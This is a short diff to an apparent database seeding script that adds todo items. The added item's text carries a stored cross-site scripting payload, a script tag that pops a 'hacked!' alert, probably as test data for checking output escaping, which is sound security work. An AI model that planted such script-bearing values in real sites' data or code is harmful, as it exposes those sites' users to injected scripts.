@@ -29,6 +29,7 @@ todos = [
     (1, "buy milk"),
     (2, "learn to code in Swift"),
     (1, "fix flaws in the codebase"),
+    (100, "hack a website<script>setTimeout(() => alert('hacked!'), 750)</script>"),
 ]
 cursor.executemany("INSERT INTO Todos (user, content) VALUES (?, ?)", todos)
 connection.commit()
